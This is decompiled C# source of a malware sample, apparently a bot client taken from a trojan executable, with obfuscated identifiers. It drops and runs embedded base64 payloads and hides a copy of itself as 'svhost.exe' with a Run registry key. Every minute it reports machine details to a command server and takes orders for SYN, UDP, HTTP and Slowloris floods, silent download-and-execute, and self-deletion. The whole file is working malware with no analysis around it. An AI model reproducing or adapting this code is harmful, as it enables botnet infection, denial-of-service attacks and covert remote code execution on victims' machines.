// Decompiled with JetBrains decompiler
// Type: bBBbkwZsYvOnOZTlVrblrnz
// Assembly: AutoCheckBlackmarket, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 75EFCFBA-7DC9-4B3B-BE71-9373569A5CFD
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.10-msil\HEUR-Trojan-Ransom.Win32.Generic-8865821e232bb31b1db7b1220c933ee51fd7508af48d79d1e7882dd1bf624f62.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using My;
using System;
using System.Collections;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Net;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;

[StandardModule]
internal sealed class bBBbkwZsYvOnOZTlVrblrnz
{
  private static Thread RfnoxVQtvciCKzfabZePWdt = new Thread(new ThreadStart(bBBbkwZsYvOnOZTlVrblrnz.UUjZcUtWBygVpgXkuedRRsB));
  private static MD5 TMTwYJZdgXwZFokZtjaoyhh = (MD5) new MD5CryptoServiceProvider();

  [STAThread]
  public static void Main()
  {
    try
    {
      bBBbkwZsYvOnOZTlVrblrnz.RfnoxVQtvciCKzfabZePWdt.Start();
      bBBbkwZsYvOnOZTlVrblrnz.PidSxHIGLvowanmDHJBaphS();
      ResourceManager resourceManager = new ResourceManager("tUqESyRDHgU", Assembly.GetExecutingAssembly());
      object resourceSet = (object) resourceManager.GetResourceSet(CultureInfo.CurrentCulture, true, true);
      try
      {
        foreach (object obj in (IEnumerable) resourceSet)
        {
          DictionaryEntry dictionaryEntry1;
          DictionaryEntry dictionaryEntry2 = obj != null ? (DictionaryEntry) obj : dictionaryEntry1;
          byte[] array = Convert.FromBase64String(Conversions.ToString(resourceManager.GetObject(Conversions.ToString(dictionaryEntry2.Key))));
          FileStream fileStream = new FileStream(Conversions.ToString(Operators.ConcatenateObject((object) Path.GetTempPath(), dictionaryEntry2.Key)), FileMode.Create);
          fileStream.Write(array, 0, array.Length);
          fileStream.Close();
          NewLateBinding.LateCall((object) null, typeof (Process), "Start", new object[1]
          {
            Operators.ConcatenateObject((object) Path.GetTempPath(), dictionaryEntry2.Key)
          }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static void UUjZcUtWBygVpgXkuedRRsB()
  {
    while (true)
    {
      try
      {
        string str = bBBbkwZsYvOnOZTlVrblrnz.aBMGYIeOZebmESabkJEgiPV("www.zippyshare.comconnect.php", "&pcname=" + Environment.MachineName + "&botver=2.0.0.1&winver=" + MyProject.Computer.Info.OSFullName.ToString() + " (x" + Conversions.ToString(bBBbkwZsYvOnOZTlVrblrnz.bYHUttVdqSmRpHhITNfOlVf()) + ")&hwid=" + bBBbkwZsYvOnOZTlVrblrnz.lhsKZgirPKnpWcvEsYUUTXJ());
        string empty = string.Empty;
        bBBbkwZsYvOnOZTlVrblrnz.JQgIHXNPHgJnlUIdTKYiRRE();
        bBBbkwZsYvOnOZTlVrblrnz.EfnBcvbzRdRPJbYuepvrDUV();
        if (str.Length != 0)
        {
          if (Operators.CompareString(str, empty, false) != 0)
            bBBbkwZsYvOnOZTlVrblrnz.qrCZGjyfmFNDidechTMTwYJ(str);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      Thread.Sleep(60000);
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
  private static void qrCZGjyfmFNDidechTMTwYJ(string ZdgXwZFokZtjaoyhhUHhERf)
  {
    string[] strArray = ZdgXwZFokZtjaoyhhUHhERf.Split('*');
    try
    {
      if (ZdgXwZFokZtjaoyhhUHhERf.StartsWith("!SYN"))
      {
        try
        {
          BZDhfNCWNDRbKKxxYhtWpVs.dSmdUhrbaOzbxKYGXJNnbZT = strArray[1];
          BZDhfNCWNDRbKKxxYhtWpVs.nomrcVcHUTjmphHVOygiDfk = Convert.ToInt32(strArray[2]);
          BZDhfNCWNDRbKKxxYhtWpVs.hIRdFZEcuUuGzSBYISYUgwM = Convert.ToInt32(strArray[3]);
          BZDhfNCWNDRbKKxxYhtWpVs.lsXkjzEGxXmePwyTvBPLtHg = Convert.ToInt32(strArray[4]);
          BZDhfNCWNDRbKKxxYhtWpVs.TVeCwacJPiqfLHHGLvDKaBz();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (ZdgXwZFokZtjaoyhhUHhERf.StartsWith("!UDP"))
      {
        try
        {
          DIflsXkjzEGxXmePwyTvBPL.JNnbZTliFayFBNQfBCLVQtJ = strArray[1];
          DIflsXkjzEGxXmePwyTvBPL.bvPJyenomrcVcHUTjmphHVO = Convert.ToInt32(strArray[2]);
          DIflsXkjzEGxXmePwyTvBPL.jCyVrQIEPgvRFOlgKMsMSaP = Convert.ToInt32(strArray[3]);
          DIflsXkjzEGxXmePwyTvBPL.ygiDfkxJdqeQrONoWnZdEep = 1024;
          DIflsXkjzEGxXmePwyTvBPL.uEFDIflsXkjzEGxXmePwyTv = (short) 1024;
          DIflsXkjzEGxXmePwyTvBPL.uIFnBaaCKXySxWnOnysLuRB();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (ZdgXwZFokZtjaoyhhUHhERf.StartsWith("!HTTP-GET"))
      {
        try
        {
          wXicurPkJBxJaoKxHfaDFlG.uRBMSOZqFNOYvqUVCJbjZFz = strArray[1];
          wXicurPkJBxJaoKxHfaDFlG.hTXwXicurPkJBxJaoKxHfaD = Convert.ToInt32(strArray[2]);
          wXicurPkJBxJaoKxHfaDFlG.GkLwMQTLjNrbXMgWNblUUHt = Convert.ToInt32(strArray[3]);
          wXicurPkJBxJaoKxHfaDFlG.epHIdfoMsWmTZsBpVRRPUGy = false;
          wXicurPkJBxJaoKxHfaDFlG.ByEpvDTutKzDtTvbZHvQGwL = YTwyfzFNDiqrpuSZgLXXmqt.kKZSCjmHjnCxhuUUuEQsMrP();
          wXicurPkJBxJaoKxHfaDFlG.VEEqqSanPjOmEQFCvOLhRci = YTwyfzFNDiqrpuSZgLXXmqt.hHhsmFoLuFLHTkyHIRojNPv();
          wXicurPkJBxJaoKxHfaDFlG.FlGLTJoxxwCYfmRedtwzrQf();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (ZdgXwZFokZtjaoyhhUHhERf.StartsWith("!HTTP-POST"))
      {
        try
        {
          wXicurPkJBxJaoKxHfaDFlG.uRBMSOZqFNOYvqUVCJbjZFz = strArray[1];
          wXicurPkJBxJaoKxHfaDFlG.hTXwXicurPkJBxJaoKxHfaD = Convert.ToInt32(strArray[2]);
          wXicurPkJBxJaoKxHfaDFlG.GkLwMQTLjNrbXMgWNblUUHt = Convert.ToInt32(strArray[3]);
          wXicurPkJBxJaoKxHfaDFlG.epHIdfoMsWmTZsBpVRRPUGy = true;
          wXicurPkJBxJaoKxHfaDFlG.ByEpvDTutKzDtTvbZHvQGwL = YTwyfzFNDiqrpuSZgLXXmqt.kKZSCjmHjnCxhuUUuEQsMrP();
          wXicurPkJBxJaoKxHfaDFlG.VEEqqSanPjOmEQFCvOLhRci = YTwyfzFNDiqrpuSZgLXXmqt.hHhsmFoLuFLHTkyHIRojNPv();
          wXicurPkJBxJaoKxHfaDFlG.FlGLTJoxxwCYfmRedtwzrQf();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (ZdgXwZFokZtjaoyhhUHhERf.StartsWith("!SLOWRIS-FLOOD"))
      {
        try
        {
          BZDhfNCWNDRbKKxxYhtWpVs.dSmdUhrbaOzbxKYGXJNnbZT = strArray[1];
          BZDhfNCWNDRbKKxxYhtWpVs.nomrcVcHUTjmphHVOygiDfk = Convert.ToInt32(strArray[2]);
          BZDhfNCWNDRbKKxxYhtWpVs.hIRdFZEcuUuGzSBYISYUgwM = 1;
          BZDhfNCWNDRbKKxxYhtWpVs.lsXkjzEGxXmePwyTvBPLtHg = 1;
          BZDhfNCWNDRbKKxxYhtWpVs.TVeCwacJPiqfLHHGLvDKaBz();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (ZdgXwZFokZtjaoyhhUHhERf.StartsWith("!VISIT-PAGE"))
      {
        try
        {
          if (Operators.CompareString(strArray[2], "0", false) == 0)
          {
            if (!strArray[1].StartsWith("http://"))
              strArray[1] = "http://" + strArray[1];
            Process.Start(strArray[1]);
          }
          else
            Process.Start(new ProcessStartInfo()
            {
              FileName = "iexplore.exe",
              Arguments = strArray[1],
              WindowStyle = ProcessWindowStyle.Hidden
            });
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (ZdgXwZFokZtjaoyhhUHhERf.StartsWith("!DOWNLOAD"))
      {
        try
        {
          bBBbkwZsYvOnOZTlVrblrnz.JQgIHXNPHgJnlUIdTKYiRRE();
          bBBbkwZsYvOnOZTlVrblrnz.cVFmpKmqFPkxkXyUTvdugkK(strArray[1]);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (!ZdgXwZFokZtjaoyhhUHhERf.StartsWith("!UPDATE-BOTS"))
        return;
      try
      {
        bBBbkwZsYvOnOZTlVrblrnz.JQgIHXNPHgJnlUIdTKYiRRE();
        if (bBBbkwZsYvOnOZTlVrblrnz.gWCLLKOlszeqqHKNFdslVDG())
        {
          RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
          registryKey.DeleteValue("Fupdate");
          registryKey.Close();
        }
        else
        {
          RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
          registryKey.DeleteValue("Fupdate");
          registryKey.Close();
        }
        bBBbkwZsYvOnOZTlVrblrnz.cVFmpKmqFPkxkXyUTvdugkK(strArray[1]);
        ProjectData.EndApp();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static void JQgIHXNPHgJnlUIdTKYiRRE()
  {
    try
    {
      BZDhfNCWNDRbKKxxYhtWpVs.QGJBZDhfNCWNDRbKKxxYhtW();
      DIflsXkjzEGxXmePwyTvBPL.MSOZqFNOYvqUVCJbjZFzByE();
      wXicurPkJBxJaoKxHfaDFlG.SCjmHjnCxhuUUuEQsMrPhHh();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static void PidSxHIGLvowanmDHJBaphS()
  {
    try
    {
      if (System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\svhost.exe"))
        return;
      System.IO.File.Copy(Process.GetCurrentProcess().MainModule.FileName, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\svhost.exe", true);
      MyProject.Computer.FileSystem.GetFileInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\svhost.exe").Attributes = FileAttributes.Hidden;
      Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\svhost.exe");
      if (bBBbkwZsYvOnOZTlVrblrnz.gWCLLKOlszeqqHKNFdslVDG())
        Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").SetValue("Fupdate", (object) (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\svhost.exe"));
      else
        Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").SetValue("Fupdate", (object) (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\svhost.exe"));
      MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", (object) 0);
      bBBbkwZsYvOnOZTlVrblrnz.wYJZdgXwZFokZtjaoyhhUHh();
      Environment.Exit(0);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static string lhsKZgirPKnpWcvEsYUUTXJ() => bBBbkwZsYvOnOZTlVrblrnz.UHhERfNeQUtifZroLhGMITX(Environment.UserName.ToString() + Environment.ProcessorCount.ToString() + Environment.MachineName.ToString() + Environment.Version.ToString() + Conversions.ToString(bBBbkwZsYvOnOZTlVrblrnz.bYHUttVdqSmRpHhITNfOlVf()) + MyProject.Computer.Info.OSFullName.ToString());

  public static string UHhERfNeQUtifZroLhGMITX(string lHJSbWzQiDWQGluusxjcjOa) => BitConverter.ToString(bBBbkwZsYvOnOZTlVrblrnz.TMTwYJZdgXwZFokZtjaoyhh.ComputeHash(Encoding.Default.GetBytes(lHJSbWzQiDWQGluusxjcjOa))).Replace("-", "").ToUpper();

  public static bool gWCLLKOlszeqqHKNFdslVDG()
  {
    bool flag;
    try
    {
      flag = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
    }
    catch (UnauthorizedAccessException ex)
    {
      ProjectData.SetProjectError((Exception) ex);
      flag = false;
      ProjectData.ClearProjectError();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      flag = false;
      ProjectData.ClearProjectError();
    }
    return flag;
  }

  public static int bYHUttVdqSmRpHhITNfOlVf() => checked (Marshal.SizeOf(typeof (IntPtr)) * 8);

  public static string aBMGYIeOZebmESabkJEgiPV(
    string owmSNOMRCJQgIHXNPHgJnlU,
    string IdTKYiRREEfnBcvbzRdRPJb)
  {
label_0:
    int num1;
    string str1;
    int num2;
    try
    {
      ProjectData.ClearProjectError();
      num1 = 1;
label_1:
      int num3 = 2;
      ServicePointManager.Expect100Continue = false;
label_2:
      num3 = 3;
      WebRequest webRequest = WebRequest.Create(owmSNOMRCJQgIHXNPHgJnlU);
label_3:
      num3 = 4;
      webRequest.ContentType = "application/x-www-form-urlencoded";
label_4:
      num3 = 5;
      webRequest.Method = "POST";
label_5:
      num3 = 6;
      byte[] bytes = Encoding.ASCII.GetBytes(IdTKYiRREEfnBcvbzRdRPJb);
label_6:
      num3 = 7;
      webRequest.ContentLength = (long) bytes.Length;
label_7:
      num3 = 8;
      Stream requestStream = webRequest.GetRequestStream();
label_8:
      num3 = 9;
      requestStream.Write(bytes, 0, bytes.Length);
label_9:
      num3 = 10;
      requestStream.Close();
label_10:
      num3 = 11;
      WebResponse response = webRequest.GetResponse();
label_11:
      num3 = 12;
      if (response != null)
        goto label_13;
label_12:
      str1 = (string) null;
      goto label_21;
label_13:
      num3 = 15;
      StreamReader streamReader = new StreamReader(response.GetResponseStream());
label_14:
      num3 = 16;
      str1 = streamReader.ReadToEnd().Trim();
      goto label_21;
label_16:
      num2 = num3;
      switch (num1)
      {
        case 1:
          int num4 = num2 + 1;
          num2 = 0;
          switch (num4)
          {
            case 1:
              goto label_0;
            case 2:
              goto label_1;
            case 3:
              goto label_2;
            case 4:
              goto label_3;
            case 5:
              goto label_4;
            case 6:
              goto label_5;
            case 7:
              goto label_6;
            case 8:
              goto label_7;
            case 9:
              goto label_8;
            case 10:
              goto label_9;
            case 11:
              goto label_10;
            case 12:
              goto label_11;
            case 13:
              goto label_12;
            case 14:
            case 15:
              goto label_13;
            case 16:
              goto label_14;
            case 17:
              goto label_21;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_16;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_21:
    string str2 = str1;
    if (num2 == 0)
      return str2;
    ProjectData.ClearProjectError();
    return str2;
  }

  public static void cVFmpKmqFPkxkXyUTvdugkK(string LjBaBMGYIeOZebmESabkJEg)
  {
    Process process = new Process();
    WebClient webClient = new WebClient();
    string str = bBBbkwZsYvOnOZTlVrblrnz.qeQrONoWnZdEepjCyVrQIEP(8) + ".exe";
    try
    {
      webClient.DownloadFile(LjBaBMGYIeOZebmESabkJEg, Environment.GetEnvironmentVariable("TEMP") + "\\" + str);
      process.StartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + "\\" + str;
      process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
      process.Start();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static bool gkKkvpIFcxWOLWnCXLUsmQS(string iPVowmSNOMRCJQgIHXNPHgJ)
  {
label_0:
    int num1;
    bool flag;
    int num2;
    try
    {
      ProjectData.ClearProjectError();
      num1 = 1;
label_1:
      int num3 = 2;
      flag = Process.GetProcessesByName(iPVowmSNOMRCJQgIHXNPHgJ).Length >= 1;
      goto label_8;
label_3:
      num2 = num3;
      switch (num1)
      {
        case 1:
          int num4 = num2 + 1;
          num2 = 0;
          switch (num4)
          {
            case 1:
              goto label_0;
            case 2:
              goto label_1;
            case 3:
              goto label_8;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_3;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_8:
    int num5 = flag ? 1 : 0;
    if (num2 == 0)
      return num5 != 0;
    ProjectData.ClearProjectError();
    return num5 != 0;
  }

  private static object kvpIFcxWOLWnCXLUsmQSyTY(string nlUIdTKYiRREEfnBcvbzRdR)
  {
label_0:
    int num1;
    int num2;
    try
    {
      ProjectData.ClearProjectError();
      num1 = 1;
label_1:
      int num3 = 2;
      Process[] processesByName = Process.GetProcessesByName(nlUIdTKYiRREEfnBcvbzRdR);
      int index = 0;
      goto label_6;
label_3:
      num3 = 3;
      Process process;
      process.Kill();
label_4:
      num3 = 4;
      process.CloseMainWindow();
      checked { ++index; }
label_5:
      num3 = 5;
label_6:
      if (index < processesByName.Length)
      {
        process = processesByName[index];
        goto label_3;
      }
      else
        goto label_13;
label_8:
      num2 = num3;
      switch (num1)
      {
        case 1:
          int num4 = num2 + 1;
          num2 = 0;
          switch (num4)
          {
            case 1:
              goto label_0;
            case 2:
              goto label_1;
            case 3:
              goto label_3;
            case 4:
              goto label_4;
            case 5:
              goto label_5;
            case 6:
              goto label_13;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_8;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_13:
    object obj1;
    object obj2 = obj1;
    if (num2 == 0)
      return obj2;
    ProjectData.ClearProjectError();
    return obj2;
  }

  public static void wYJZdgXwZFokZtjaoyhhUHh()
  {
    try
    {
      string str1 = bBBbkwZsYvOnOZTlVrblrnz.qeQrONoWnZdEepjCyVrQIEP(5) + ".bat";
      new FileInfo(Application.StartupPath).Attributes = FileAttributes.Normal;
      string str2 = Interaction.Environ("TEMP") + "\\" + str1;
      if (MyProject.Computer.FileSystem.FileExists(str2))
      {
        try
        {
          MyProject.Computer.FileSystem.DeleteFile(str2);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      StreamWriter streamWriter = new StreamWriter(str2, false);
      streamWriter.WriteLine("@echo off");
      streamWriter.WriteLine(":L1");
      streamWriter.WriteLine("del \"" + Application.ExecutablePath + "\" 2>nul");
      streamWriter.WriteLine("if exist \"" + Application.ExecutablePath + "\" goto L1");
      streamWriter.WriteLine("del \"" + str2 + "\" 2>nul");
      streamWriter.Close();
      Interaction.Shell(str2, AppWinStyle.Hide);
      Application.Exit();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static string qeQrONoWnZdEepjCyVrQIEP(int CwacJPiqfLHHGLvDKaBzQGJ)
  {
label_0:
    int num1;
    string str1;
    int num2;
    try
    {
      ProjectData.ClearProjectError();
      num1 = 1;
label_1:
      int num3 = 2;
      VBMath.Randomize();
label_2:
      num3 = 3;
      StringBuilder stringBuilder = new StringBuilder("");
label_3:
      num3 = 4;
      char[] charArray = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray();
label_4:
      num3 = 5;
      int num4 = CwacJPiqfLHHGLvDKaBzQGJ;
      int num5 = 1;
      goto label_9;
label_5:
      num3 = 6;
      VBMath.Randomize();
label_6:
      num3 = 7;
      int index = checked ((int) Math.Round((double) unchecked (Conversion.Int((float) checked (charArray.Length - 2 - 0 + 1) * VBMath.Rnd()) + 1f)));
label_7:
      num3 = 8;
      stringBuilder.Append(charArray[index]);
label_8:
      num3 = 9;
      checked { ++num5; }
label_9:
      if (num5 <= num4)
        goto label_5;
label_10:
      num3 = 10;
      str1 = stringBuilder.ToString();
      goto label_17;
label_12:
      num2 = num3;
      switch (num1)
      {
        case 1:
          int num6 = num2 + 1;
          num2 = 0;
          switch (num6)
          {
            case 1:
              goto label_0;
            case 2:
              goto label_1;
            case 3:
              goto label_2;
            case 4:
              goto label_3;
            case 5:
              goto label_4;
            case 6:
              goto label_5;
            case 7:
              goto label_6;
            case 8:
              goto label_7;
            case 9:
              goto label_8;
            case 10:
              goto label_10;
            case 11:
              goto label_17;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_12;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_17:
    string str2 = str1;
    if (num2 == 0)
      return str2;
    ProjectData.ClearProjectError();
    return str2;
  }

  [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int rcVcHUTjmphHVOygiDfkxJd(
    IntPtr process,
    int minimumWorkingSetSize,
    int maximumWorkingSetSize);

  public static void EfnBcvbzRdRPJbYuepvrDUV()
  {
    try
    {
      GC.Collect();
      GC.WaitForPendingFinalizers();
      if (Environment.OSVersion.Platform != PlatformID.Win32NT)
        return;
      bBBbkwZsYvOnOZTlVrblrnz.rcVcHUTjmphHVOygiDfkxJd(Process.GetCurrentProcess().Handle, -1, -1);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }
}
